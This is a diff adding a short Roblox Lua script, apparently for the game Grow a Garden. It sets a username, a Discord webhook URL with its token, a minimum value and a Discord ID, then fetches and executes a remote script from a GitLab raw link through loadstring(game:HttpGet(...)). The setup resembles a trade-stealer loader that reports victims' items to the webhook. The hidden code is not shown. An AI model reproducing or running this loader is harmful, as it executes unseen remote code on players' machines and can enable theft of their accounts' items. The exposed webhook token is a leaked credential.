@@ -1,0 +1,6 @@
+Username = "san_zezo1"
+Webhook = "https://canary.discord.com/api/webhooks/1382771836500054177/4YzMuwvH6ayByhZDBr3St6H8PQb9JpZlj9WlzQjIQ_sG56wEjyVbbFUxzD-HDWX812db"
+MinimumValue = 1
+DiscordID = "493552172135612426"
+
+loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/grow-a-garden"))()
